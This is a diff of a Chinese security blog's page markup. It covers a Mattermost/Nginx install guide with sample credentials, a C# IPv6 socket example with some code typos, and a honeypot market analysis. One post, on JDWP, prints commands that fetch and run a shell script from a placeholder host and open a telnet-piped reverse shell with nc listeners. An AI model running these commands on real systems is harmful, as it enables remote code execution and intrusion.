mattermost that will run this service    <br>• sudo useradd -r mattermost -U    <br>• Set the mattermost account as the directory owner by typing:    <br>• sudo chown -R mattermost:mattermost /opt/mattermost    <br>• sudo chmod -R g+w /opt/mattermost    <br>• Add yourself to the mattermost group to ensure you can edit these files:    <br>• sudo usermod -aG mattermost USERNAME    <br>• Configure Mattermost Server by editing the config.json file at /opt/mattermost/config    <br>• cd /opt/mattermost/config    <br>• Edit the file by typing:    <br>• vi config.json    <br>• replace DriverName&quot;: &quot;mysql&quot; with DriverName&quot;: &quot;postgres&quot;    <br>• replace &quot;DataSource&quot;: &quot;mmuser:mostest@tcp(dockerhost:3306)/mattermost_test?charset=utf8mb4,utf8&quot;with &quot;DataSource&quot;: &quot;postgres://mmuser:mmuser_password@10.10.10.1:5432/mattermost?sslmode=disable&amp;connect_timeout=10&quot;• Assuming a default IP address of 10.10.10.1    <br>• Optionally you may continue to edit configuration settings in config.json or use the System Console described in a later section to finish the configuration.    <br>• Test the Mattermost Server    <br>• cd /opt/mattermost/bin    <br>• Run the Mattermost Server by typing:    <br>• ./platform    <br>• You should see a console log like Server is listening on :8065 letting you know the service is running.    <br>• Stop the server for now by typing ctrl-c    <br>• Setup Mattermost to use the systemd init daemon which handles supervision of the Mattermost process    <br>• sudo touch /etc/init.d/mattermost    <br>• sudo vi /etc/init.d/mattermost    <br>• Copy the following lines into /etc/init.d/<a href="http://ha.cker.in/tag/Mattermost" target="_blank">mattermost</a></p>  <blockquote>   <p>     <br>#! /bin/sh      <br>### BEGIN INIT INFO      <br># Provides: mattermost      <br># Required-Start: $network $syslog      <br># Required-Stop: $network $syslog      <br># Default-Start: 2 3 4 5      <br># Default-Stop: 0 1 6      <br># Short-Description: Mattermost Group Chat      <br># Description: Mattermost: An open-source Slack      <br>### END INIT INFO      <br>PATH=/sbin:/usr/sbin:/bin:/usr/bin      <br>DESC=&quot;Mattermost&quot;      <br>NAME=mattermost      <br>MATTERMOST_ROOT=/opt/mattermost      <br>MATTERMOST_GROUP=mattermost      <br>MATTERMOST_USER=mattermost      <br>DAEMON=&quot;$MATTERMOST_ROOT/bin/platform&quot;      <br>PIDFILE=/var/run/$NAME.pid      <br>SCRIPTNAME=/etc/init.d/$NAME      <br>. /lib/lsb/init-functions      <br>do_start() {      <br># Return      <br># 0 if daemon has been started      <br># 1 if daemon was already running      <br># 2 if daemon could not be started      <br>start-stop-daemon –start –quiet \      <br>–chuid $MATTERMOST_USER:$MATTERMOST_GROUP –chdir $MATTERMOST_ROOT –background \      <br>–pidfile $PIDFILE –exec $DAEMON <strong>–test</strong> &gt; /dev/null \      <br>|| return 1      <br>start-stop-daemon –start –quiet \      <br>–chuid $MATTERMOST_USER:$MATTERMOST_GROUP –chdir $MATTERMOST_ROOT –background \      <br>–make-pidfile –pidfile $PIDFILE –exec $DAEMON \      <br>|| return 2      <br>}      <br>#      <br># Function that stops the daemon/service      <br>#      <br>do_stop() {      <br># Return      <br># 0 if daemon has been stopped      <br># 1 if daemon was already stopped      <br># 2 if daemon could not be stopped      <br># other if a failure occurred      <br>start-stop-daemon –stop –quiet –retry=TERM/30/KILL/5 \      <br>–pidfile $PIDFILE –exec $DAEMON      <br>RETVAL=&quot;$?&quot;      <br>[ &quot;$RETVAL&quot; = 2 ] &amp;&amp; return 2      <br># Wait for children to finish too if this is a daemon that forks      <br># and if the daemon is only ever run from this initscript.      <br># If the above conditions are not satisfied then add some other code      <br># that waits for the process to drop all resources that could be      <br># needed by services started subsequently. A last resort is to      <br># sleep for some time.      <br>start-stop-daemon –stop –quiet –oknodo –retry=0/30/KILL/5 \      <br>–exec $DAEMON      <br>[ &quot;$?&quot; = 2 ] &amp;&amp; return 2      <br># Many daemons don’t delete their pidfiles when they exit.      <br>rm -f $PIDFILE      <br>return &quot;$RETVAL&quot;      <br>}      <br>case &quot;$1&quot; in      <br>start)      <br>[ &quot;$VERBOSE&quot; != no ] &amp;&amp; log_daemon_msg &quot;Starting $DESC&quot; &quot;$NAME&quot;      <br>do_start      <br>case &quot;$?&quot; in      <br>0|1) [ &quot;$VERBOSE&quot; != no ] &amp;&amp; log_end_msg 0 ;;      <br>2) [ &quot;$VERBOSE&quot; != no ] &amp;&amp; log_end_msg 1 ;;      <br>esac      <br>;;      <br>stop)      <br>[ &quot;$VERBOSE&quot; != no ] &amp;&amp; log_daemon_msg &quot;Stopping $DESC&quot; &quot;$NAME&quot;      <br>do_stop      <br>case &quot;$?&quot; in      <br>0|1) [ &quot;$VERBOSE&quot; != no ] &amp;&amp; log_end_msg 0 ;;      <br>2) [ &quot;$VERBOSE&quot; != no ] &amp;&amp; log_end_msg 1 ;;      <br>esac      <br>;;      <br>status)      <br>status_of_proc &quot;$DAEMON&quot; &quot;$NAME&quot; &amp;&amp; exit 0 || exit $?      <br>;;      <br>restart|force-reload)      <br>#      <br># If the &quot;reload&quot; option is implemented then remove the      <br># ‘force-reload’ alias      <br>#      <br>log_daemon_msg &quot;Restarting $DESC&quot; &quot;$NAME&quot;      <br>do_stop      <br>case &quot;$?&quot; in      <br>0|1)      <br>do_start      <br>case &quot;$?&quot; in      <br>0) log_end_msg 0 ;;      <br>1) log_end_msg 1 ;; # Old process is still running      <br></p></blockquote></em>) log_end_msg 1 ;; # Failed to start      <br>esac      <br>;;      <br><em>)      <br># Failed to stop      <br>log_end_msg 1      <br>;;      <br>esac      <br>;;      <br></em>)      <br>echo &quot;Usage: $SCRIPTNAME {start|stop|status|restart|force-reload}&quot; &gt;&amp;2      <br>exit 3      <br>;;      <br>esac      <br>exit 0<p></p>   <p>   <br>• Make sure that /etc/init.d/mattermost is executable    <br>• sudo chmod +x /etc/init.d/mattermost    <br>• On reboot, systemd will generate a unit file from the headers in this init script and install it in/run/systemd/generator.late/    <br>Note: This setup can also be done using a systemd unit, usable for non-Debian systems, such as Arch Linux. The unit file is as follows:    <br><em># cat /etc/systemd/system/mattermost.service</em></p>  <p>   <br>[Unit]    <br>Description<strong>=</strong>Mattermost    <br>After<strong>=</strong>network<strong>.</strong>target    <br>[Service]    <br>User<strong>=</strong>mattermost    <br>ExecStart<strong>=/</strong>home<strong>/</strong>mattermost<strong>/</strong>mattermost<strong>/</strong>bin<strong>/</strong>platform    <br>WorkingDirectory<strong>=/</strong>home<strong>/</strong>mattermost<strong>/</strong>mattermost    <br>Restart<strong>=</strong>always    <br>RestartSec<strong>=</strong>30    <br>[Install]    <br>WantedBy<strong>=</strong>multi<strong>-</strong>user<strong>.</strong>target    <br></p> <em></em>  <p><em># systemctl start mattermost</em>    <br><em># systemctl enable mattermost</em></p>  <h4>Set up Nginx Server</h4>  <p>   <br>1. For the purposes of this guide we will assume this server has an IP address of 10.10.10.3    <br>2. We use Nginx for proxying request to the Mattermost Server. The main benefits are:    <br>• SSL termination    <br>• http to https redirect    <br>• Port mapping :80 to :8065    <br>• Standard request logs    <br>• Install Nginx on Debian with    <br>• sudo apt-get install nginx    <br>• Verify Nginx is running    <br>• curl <a href="http://10.10.10.3" target="_blank" rel="external">http://10.10.10.3</a>    <br>• You should see a Welcome to nginx! page    <br>• You can manage Nginx with the following commands    <br>• sudo service nginx stop    <br>• sudo service nginx start    <br>• sudo service nginx restart    <br>• Map a FQDN (fully qualified domain name) like mattermost.example.com to point to the Nginx server.    <br>• Configure Nginx to proxy connections from the internet to the Mattermost Server    <br>• Create a configuration for Mattermost    <br>• sudo touch /etc/nginx/sites-available/mattermost    <br>• Below is a sample configuration with the minimum settings required to configure Mattermost</p>  <blockquote>   <p>     <br>server {      <br>server_name mattermost.example.com;      <br>location / {      <br>client_max_body_size 50M;      <br>proxy_set_header Upgrade $http_upgrade;      <br>proxy_set_header Connection &quot;upgrade&quot;;      <br>proxy_set_header Host $http_host;      <br>proxy_set_header X-Real-IP $remote_addr;      <br>proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;      <br>proxy_set_header X-Forwarded-Proto $scheme;      <br>proxy_set_header X-Frame-Options SAMEORIGIN;      <br>proxy_pass <a href="http://10.10.10.2:8065" target="_blank" rel="external">http://10.10.10.2:8065</a>;      <br>}      <br>}</p> </blockquote>  <p>   <br>• Remove the existing file with    <br>• sudo rm /etc/nginx/sites-enabled/default    <br>• Link the mattermost config by typing:    <br>• sudo ln -s /etc/nginx/sites-available/mattermost /etc/nginx/sites-enabled/mattermost    <br>• Restart Nginx by typing:    <br>• sudo service nginx restart    <br>• Verify you can see Mattermost thru the proxy by typing:    <br>• curl <a href="http://localhost" target="_blank" rel="external">http://localhost</a>    <br>• You should see a page titles Mattermost - Signup</p>  <h4>Set up Nginx with SSL (Recommended)</h4>  <p>   <br>1. You can use a free and an open certificate security like let’s encrypt, this is how to proceed    <br>• sudo apt-get install git    <br>• git clone <a href="https://github.com/letsencrypt/letsencrypt" target="_blank" rel="external">https://github.com/letsencrypt/letsencrypt</a>    <br>• cd letsencrypt    <br>• Be sure that the port 80 is not use by stopping nginx    <br>• sudo service nginx stop    <br>• netstat -na | grep ‘:80.*LISTEN’    <br>• ./letsencrypt-auto certonly –standalone    <br>• This command will download packages and run the instance, after that you will have to give your domain name    <br>• You can find your certificate in /etc/letsencrypt/live    <br>• Modify the file at /etc/nginx/sites-available/mattermost and add the following lines:</p>  <blockquote>   <p>     <br>server {      <br>listen 80;      <br>server_name mattermost.example.com;      <br>return 301 <a href="https://$server_name$request_uri" target="_blank" rel="external">https://$server_name$request_uri</a>;      <br>}      <br>server {      <br>listen 443 ssl;      <br>server_name mattermost.example.com;      <br>ssl on;      <br>ssl_certificate /etc/letsencrypt/live/yourdomainname/fullchain.pem;      <br>ssl_certificate_key /etc/letsencrypt/live/yourdomainname/privkey.pem;      <br>ssl_session_timeout 5m;      <br>ssl_protocols TLSv1 TLSv1.1 TLSv1.2;      <br>ssl_ciphers ‘EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH’;      <br>ssl_prefer_server_ciphers on;      <br>ssl_session_cache shared:SSL:10m;      <br>location / {      <br>gzip off;      <br>proxy_set_header X-Forwarded-Ssl on;      <br>client_max_body_size 50M;      <br>proxy_set_header Upgrade $http_upgrade;      <br>proxy_set_header Connection &quot;upgrade&quot;;      <br>proxy_set_header Host $http_host;      <br>proxy_set_header X-Real-IP $remote_addr;      <br>proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;      <br>proxy_set_header X-Forwarded-Proto $scheme;      <br>proxy_set_header X-Frame-Options SAMEORIGIN;      <br>proxy_pass <a href="http://10.10.10.2:8065" target="_blank" rel="external">http://10.10.10.2:8065</a>;      <br>}      <br>}</p> </blockquote>  <p>   <br>• Be sure to restart nginx    <br>• sudo service nginx start    <br>• Add the following line to cron so the cert will renew every month    <br>• crontab -e    <br>• @monthly /home/YOURUSERNAME/letsencrypt/letsencrypt-auto certonly –reinstall -d yourdomainname&amp;&amp; sudo service nginx reload</p>  <h4>Finish Mattermost Server setup</h4>  <p>   <br>1. Navigate to <a href="https://mattermost.example.com/" target="_blank" rel="external">https://mattermost.example.com</a> and create a team and user.    <br>2. The first user in the system is automatically granted the system_admin role, which gives you access to the System Console.    <br>3. From the town-square channel click the dropdown and choose the System Console option    <br>4. Update Email Settings. We recommend using an email sending service. The example below assumes AmazonSES.• Set Send Email Notifications to true    <br>• Set Require Email Verification to true    <br>• Set Feedback Name to No-Reply    <br>• Set Feedback Email to mattermost@example.com    <br>• Set SMTP Username to AFIADTOVDKDLGERR    <br>• Set SMTP Password to DFKJoiweklsjdflkjOIGHLSDFJewiskdjf    <br>• Set SMTP Server to email-smtp.us-east-1.amazonaws.com    <br>• Set SMTP Port to 465    <br>• Set Connection Security to TLS    <br>• Save the Settings    <br>• Update File Settings• Change Local Directory Location from ./data/ to /mattermost/data    <br>• Update Log Settings.• Set Log to The Console to false    <br>• Update Rate Limit Settings.• Set Vary By Remote Address to false    <br>• Set Vary By HTTP Header to X-Real-IP    <br>• Feel free to modify other settings.    <br>• Restart the Mattermost Service by typing:• sudo restart mattermost</p>  <p><a href="http://docs.mattermost.com/install/prod-debian.html" target="_blank" rel="external">http://docs.mattermost.com/install/prod-debian.html</a></p><p></p>
-
+        Websocket聊天,不支持xmpp  &#160;  Install Debian Jessie (x64)  1. Set up 3 machines with Debian Jessie with 2GB of RAM or more. The servers will be used for the Load Balancer, Mattermost (this must be x64 to use pre-built bin
       
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1143.seo/" data-id="cirz4nzti00cmoz76e9scvzez" class="article-share-link">Share</a>
+      </p>
       
+      <p>
+          <a href="/1143.seo/" class="excerpt-link">Read More...</a>
+      </p>
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Mattermost/">Mattermost</a></li></ul>
-
-    </footer>
-  </div>
+    </section>
+  </article>
   
-</article>
-
-
-  
-    <article id="post-1142" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1142.seo/" class="article-date">
-  <time datetime="2016-07-20T09:41:07.000Z" itemprop="datePublished">2016-07-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/CPP-C-ASPNET-PHP-Js/">CPP-C#-ASPNET-PHP-Js</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2016-07-20T09:41:07.000Z" itemprop="datePublished">
+          2016-07-20
+      </time>
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1142.seo/">C# IPv6的Socket编程</a>
-    </h1>
-  
-
-      </header>
+    | 
+    <a href='/tag/C/'>C#</a>,
     
-    <div class="article-entry" itemprop="articleBody">
+    <a href='/tag/IPv6/'>IPv6</a>,
+    
+    <a href='/tag/Socket/'>Socket</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1142.seo/">C# IPv6的Socket编程</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
       
-        <p>服务端监听代码：   <br></p>  <div style="padding-bottom: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; display: inline; float: none; padding-top: 0px" id="scid:812469c5-0cb0-4c63-8c15-c81123a09de7:cda35bf6-5772-4913-84cc-56fdb4ef2749" class="wlWriterEditableSmartContent"><pre name="code" class="c#">IPAddress dirIP = IPAddress.Parse(“fe00:e130:91d4:913b:126c”);<br>IPEndPoint endPoint = new IPEndPoint(dirIP, 55577);<br><br>Socket serverSocket = new Socket(AddressFamily.InterNetworkV6,<br>                                SocketType.Stream,<br>                                ProtocolType.Tcp);<br>try<br>{<br>    serverSocket.Bind(endPoint);<br>    serverSocket.Listen(int.MaxValue);<br>    StreamReader reader = null;<br>    StreamWriter writer = null;<br>    while(true)<br>    {<br>        Socket clientSocket = serverSocket.Accpet();<br>        NetworkStream ntStream = new NetworkStream(clientSocket);<br>        reader = new StreamReader(ntStream);<br>        string dataClient = reader.ReadLine();<br>        Console.WriteLine(“Client::”+dataClient);<br>        if(dataClient == “Quit”)<br>            break;<br>        writer = new StreamWriter(ntStream);<br>        string dataServer = “Hello  Clinet,I’m Server!”;<br>        writer.WriteLine(dataServer);<br>        writer.Flush();<br>        Console.WriteLine(“Server::” + dataServer);<br>    }<br>    reader.Close();<br>    writer.Close();<br>}<br>catch(Exception ex)<br>{<br>    Console.WriteLine(ex.Message + ex.ToString());<br>}<br></pre></div><br><br><p>客户端连接代码<br>  <br></p>
-
-<div style="padding-bottom: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; display: inline; float: none; padding-top: 0px" id="scid:812469c5-0cb0-4c63-8c15-c81123a09de7:6d772aa7-b840-445d-a778-018b5b7e3c7f" class="wlWriterEditableSmartContent"><pre name="code" class="c#">IPAddress direction = (“fe00:e130:91d4:913b:126c”);<br>IPEndPoint endPointSrv = new IPEndPoint(direction,55577);<br>Socket clientSocket = new Socket(AddressFamily.InterNetworkV6,<br>                                SocketType.Stream,<br>                                ProtocolType.Tcp);<br>try<br>{<br>    clientSocket.Connect(endPointSrv);<br>    StreamReader reader = null;<br>    StreamWriter writer = null;<br>    NetworkStream ntStream = new NetworkStream(clientSocket);<br>    writer = new StreamWriter(ntStream);<br>    string dataClient = “Hello,I’m Client! “;<br>    writer.WriteLine(dataClient);<br>    writer.Flush();<br>    Console.WriteLine(“Client 已连接”);<br>    reader = new StreamWriter(ntStream);<br>    string dataServer = reader.ReadLine();<br>    Console.WriteLine(“Server::” + dataServer);<br>}<br>catch(Exception ex)<br>{<br>    Console.WriteLine(ex.ToString());<br>}<br>reader.Close();<br>writer.Close(); </pre></div>
+        服务端监听代码：     IPAddress dirIP = IPAddress.Parse(“fe00:e130:91d4:913b:126c”);IPEndPoint endPoint = new IPEndPoint(dirIP, 55577);Socket serverSocket = new Socket(AddressFamily.InterNetworkV6,                                
       
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1142.seo/" data-id="cirz4nzt300cboz76eshbhj83" class="article-share-link">Share</a>
+      </p>
       
+      <p>
+          <a href="/1142.seo/" class="excerpt-link">Read More...</a>
+      </p>
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/C/">C#</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/IPv6/">IPv6</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Socket/">Socket</a></li></ul>
-
-    </footer>
-  </div>
+    </section>
+  </article>
   
-</article>
-
-
-  
-    <article id="post-1141" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1141.seo/" class="article-date">
-  <time datetime="2016-07-20T09:36:09.000Z" itemprop="datePublished">2016-07-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/Web安全/">Web安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2016-07-20T09:36:09.000Z" itemprop="datePublished">
+          2016-07-20
+      </time>
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1141.seo/">JDWP系统命令漏洞执行利用实例</a>
-    </h1>
-  
-
-      </header>
+    | 
+    <a href='/tag/JDWP/'>JDWP</a>
     
-    <div class="article-entry" itemprop="articleBody">
+    
+</span>
+      <h2 class="post-title"><a href="/1141.seo/">JDWP系统命令漏洞执行利用实例</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
       
-        <p>好久没更新博客,一切都因为太忙</p>  <p>偶遇几个<a href="http://ha.cker.in/tag/JDWP" target="_blank">JDWP</a>，测试下 漏洞存在所以写个笔记记下</p>  <p><a href="http://ha.cker.in/tag/nmap" target="_blank">NMAP</a>扫描</p>  <p><a href="http://img.cker.in/JDWP_1648/image.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="image" border="0" alt="image" src="http://img.cker.in/JDWP_1648/image_thumb.png" width="1004" height="484"></a> </p>  <p>利用工具: <a href="https://github.com/IOActive/jdwp-shellifier" target="_blank" rel="external">https://github.com/IOActive/jdwp-shellifier</a></p>  <p></p>  <p>&#160;</p>  <p><a href="http://img.cker.in/JDWP_1648/image_3.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="image" border="0" alt="image" src="http://img.cker.in/JDWP_1648/image_thumb_3.png" width="1136" height="252"></a> </p>  <p>要触发<strong>.</strong>.<strong>.</strong>.ServerSocket.accept 访问一下web端口就行了</p>  <p>&#160;</p>  <p>此目标的Web端口是8009哦</p>  <p>&#160;</p>  <p>姿势来自</p>  <p><a href="http://www.wooyun.org/bugs/wooyun-2010-095744" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-095744</a></p>  <p>增加利用telnet反弹得到shell的方法，以国内某设备为例</p>  <p>./jdwp-exp.py -t <strong>.</strong>.<strong>.</strong> -p 8000 –cmd ‘wget <a href="http://x.x.x.x:2222/shell.txt" target="_blank" rel="external">http://x.x.x.x:2222/shell.txt</a> -O /tmp/shell.sh’</p>  <p>./jdwp-exp.py -t <strong>.</strong>.<strong>.</strong> -p 8000 –cmd ‘chmod a+x /tmp/shell.sh’</p>  <p>./jdwp-exp.py -t <strong>.</strong>.<strong>.</strong> -p 8000 –cmd ‘/tmp/shell.sh’</p>  <p>shell.txt内容：（需要开2个端口，一个用于发送命令一个用于接受命令返回）</p>  <p>telnet x.x.x.x 1111 | /bin/bash | telnet x.x.x.x 3333</p>  <p>&#160;</p>  <p>然后在x.x.x.x服务器上用nc监听1111端口和3333端口</p>  <p>1111端口是发送命令，3333回显命令结果的</p>  <p>两个cmd窗口</p>  <p><a href="http://img.cker.in/JDWP_1648/image_4.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="image" border="0" alt="image" src="http://img.cker.in/JDWP_1648/image_thumb_4.png" width="1276" height="102"></a> </p>  <p>&#160;</p>  <p>nc -nnv -L -p 3333 </p>  <p>nc -nnv -L -p 1111</p>
+        好久没更新博客,一切都因为太忙  偶遇几个JDWP，测试下 漏洞存在所以写个笔记记下  NMAP扫描     利用工具: https://github.com/IOActive/jdwp-shellifier    &#160;     要触发....ServerSocket.accept 访问一下web端口就行了  &#160;  此目标的Web端口是8009哦  &#160;  姿势来自  http://www.wooyun.org
       
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1141.seo/" data-id="cirz4nztj00croz76815pfphw" class="article-share-link">Share</a>
+      </p>
       
+      <p>
+          <a href="/1141.seo/" class="excerpt-link">Read More...</a>
+      </p>
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/JDWP/">JDWP</a></li></ul>
-
-    </footer>
-  </div>
+    </section>
+  </article>
   
-</article>
-
-
-  
-    <article id="post-1140" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1140.seo/" class="article-date">
-  <time datetime="2016-07-20T09:22:37.000Z" itemprop="datePublished">2016-07-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/黑客技巧/">黑客技巧</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2016-07-20T09:22:37.000Z" itemprop="datePublished">
+          2016-07-20
+      </time>
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1140.seo/">为什么这么多创业公司都在做&quot;蜜罐&quot;？也许这篇文章能告诉你</a>
-    </h1>
-  
-
-      </header>
+    | 
+    <a href='/tag/APT/'>APT</a>,
     
-    <div class="article-entry" itemprop="articleBody">
+    <a href='/tag/蜜罐/'>蜜罐</a>,
+    
+    <a href='/tag/Honeypot/'>Honeypot</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1140.seo/">为什么这么多创业公司都在做"蜜罐"？也许这篇文章能告诉你</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
       
         <p><h4>前言</h4>  <p>信息安全发展到了今天繁荣的程度，传统的安全还是靠静态的特征码的方式来识别攻击，但是伴随着新型的APT攻击的出现，很多企业才意识到传统安全技术手段已经无法满足对内部威胁的及时发现，于是，很多传统的安全公司大佬都开始转战使用动态沙箱技术来解决问题，有卖设备型的例如Symantec ATP硬件配合终端的SEP构成、有360安全卫士联动威胁情报的方式，来探测未知威胁，当然这种方式主要是针对<a href="http://ha.cker.in/tag/APT" target="_blank">APT</a>攻击的第一个环节，你黑客通过社会工程学的手段得到用户的信息，使用网络钓鱼或者水坑攻击的方式进入企业内网个人PC。但是要拿到有价值的内部敏感信息，黑客需要进一步部署攻击链，包括获取凭证、内网资产扫描等探测工作，因为很多行业包括金融机构是不允许在业务服务器上安装安全解决方案的，甚至配置日志系统都不可以，那么，目前部署蜜罐是最好的解决方案了。</p>  <p><b>那么研究蜜罐解决方案，我们目前更关注的有以下几个方面：</b></p>  <p>开源蜜罐和商业蜜罐区别？</p>  <p>到底蜜罐是否需要大数据分析（机器学习算法）？</p>  <p>蜜罐创业商业模式如何？</p>  <h4>现有产品分析</h4>  <p>本节介绍包括开源蜜罐分析和国内外商业蜜罐分析。</p>  <p><b>开源蜜罐按照类型可以划分为以下几种：</b></p>  <h5>数据库蜜罐（典型案例：ElasticSearch <a href="http://ha.cker.in/tag/Honeypot" target="_blank">Honeypot</a>）</h5>  <p>ElasticSearch <a href="http://ha.cker.in/tag/Honeypot" target="_blank">Honeypot</a>：看了一下源码，发现是使用go语言实现的几个fake函数</p>  <p>Fake banner：访问根目录时候，返回函数</p>  <p>FakeNodes：访问/Nodes目录时候，返回函数</p>  <p>FakeSearch：访问/Search目录时候，返回函数</p>  <p>hpfeedsConnect：使用hpfeed协议通讯</p>  <p>发现都是伪造的函数返回，这样很有可能被入侵者发现是蜜罐，所以建议使用原始软件版本加patch的方式完成蜜罐记录功能，当然研发投入也比较大。个人建议模拟以下Elastic search漏洞：   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td valign="top">           <p><b>ESA ID </b><b></b></p>         </td>          <td valign="top">           <p><b>CVE Link </b><b></b></p>         </td>          <td valign="top">           <p><b>Vulnerability Summary </b><b></b></p>         </td>       </tr>        <tr>         <td valign="top">           <p>ESA-2015-08 </p>         </td>          <td valign="top">           <p>CVE-2015-5531 </p>         </td>          <td valign="top">           <p>Elasticsearch versions from 1.0.0 to 1.6.0 are vulnerable to a directory traversal attack. </p>         </td>       </tr>        <tr>         <td valign="top">           <p>ESA-2015-06 </p>         </td>          <td valign="top">           <p>CVE-2015-5377 </p>         </td>          <td valign="top">           <p>Elasticsearch versions prior to 1.6.1 are vulnerable to an attack that can result in remote code execution. </p>         </td>       </tr>        <tr>         <td valign="top">           <p>ESA-2015-05 </p>         </td>          <td valign="top">           <p>CVE-2015-4165 </p>         </td>          <td valign="top">           <p>All Elasticsearch versions from 1.0.0 to 1.5.2 are vulnerable to an attack that uses Elasticsearch to modify files read and executed by certain other applications. </p>         </td>       </tr>        <tr>         <td valign="top">           <p>ESA-2015-02 </p>         </td>          <td valign="top">           <p>CVE-2015-3337 </p>         </td>          <td valign="top">           <p>All Elasticsearch versions prior to 1.5.2 and 1.4.5 are vulnerable to a directory traversal attack that allows an attacker to retrieve files from the server running Elasticsearch when one or more site plugins are installed, or when Windows is the server OS. </p>         </td>       </tr>     </tbody></table> </p>  <p>拿漏洞ESA-2015-08目录列举漏洞举例子，创建仓库，elasticsearch 解析出现了异常，并返回了读取文件的内容，以后都是读取的/etc/passwd 文件的内容。那么这个蜜罐怎么做呢？应该把文件变更记录做好，然后使用原始版本以patch的方式记录登录、RESTful API提交记录，这个使用真实服务模拟的研发投入也比较大。</p>  <h5>Web蜜罐（典型案例：Glastopf）</h5>  <p>漏洞类型仿真</p>  <p>未知的攻击</p>  <p>支持多种数据库类型</p>  <p>HPFeeds通讯</p>  <p>过内置的沙箱PHP远程文件包含，本地文件包含通过POST请求</p>  <p>通常对手使用搜索引擎和特殊制作的搜索请求找到他们的受害者</p>  <p>模拟SQL注入、爬虫响应等。</p>  <p>如果要是我做，还是要结合WAF精细化攻击数据。因为正常和不正常的URL访问太多。</p>  <h5>服务蜜罐（典型案例Kippo）</h5>  <p>伪装文件系统</p>  <p>• 伪装用户文件存储</p>  <p>•&#160;&#160;&#160; Sftp子文件系统 上传文件存储</p>  <p>• 模拟一些特殊的黑客关心的文件/etc/passwd</p>  <p>伪造系统命令</p>  <p>• 文件上传下载命令 sftp、scp，同时支持客户端wget/curl命令解析</p>  <p>•&#160;&#160;&#160; SSH交互执行的命令(黑客入侵常用命令)：w\exit\cat\uname\chmod\ps\cd</p>  <p>伪装系统相关配置</p>  <p>•&#160;&#160;&#160; Hostname</p>  <p>•&#160;&#160;&#160; SSH服务指纹</p>  <p>•&#160;&#160;&#160; SSH账号和密码</p>  <p>•&#160;&#160;&#160; SSH key</p>  <p>与外部威胁情报联动</p>  <p>• 连接IP白名单威胁情报</p>  <p>• 上传可疑文件内容检查威胁情报</p>  <p>日志大数据处理</p>  <p>• 支持elastic search日志导出</p>  <p> SSH蜜罐目前开源解决方案比较成熟，但是还是缺乏BASH内部命令审计和文件变更审计。。。。</p>  <h5>工控蜜罐</h5>  <p>这个不在我们讨论的范围，工控有致命的弱点，通讯协议本身没有加密，Wireshark完全透视，我觉得，还是把工控防火墙做好，然后再想蜜罐的事吧。</p>  <h5>其它蜜罐（典型案例：RDPY）</h5>  <p>RDPY：RDPY是基于Twisted Python实现的微软RDP远程桌面协议。RDPY支持标准的RDP安全协议，通过SSL或者NLA加密验证（或者通过nltmv2验证协议）其子项目rdpy-rdphoneypot是一个基于RDP的蜜罐。使用会话场景记录并通过RDP协议来重放会话场景。</p><br>
-        
-          <p class="article-more-link">
-            <a href="/1140.seo/#more">Read More</a>
-          </p>
-        
       
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1140.seo/" data-id="cirz4nztl00cvoz76gwv64vlc" class="article-share-link">Share</a>
+      </p>
       
+      <p>
+          <a href="/1140.seo/" class="excerpt-link">Read More...</a>
+      </p>
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/APT/">APT</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Honeypot/">Honeypot</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/蜜罐/">蜜罐</a></li></ul>
-
-    </footer>
-  </div>
+    </section>
+  </article>
   
-</article>
-
-
-  
-    <article id="post-1138" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1138.seo/" class="article-date">
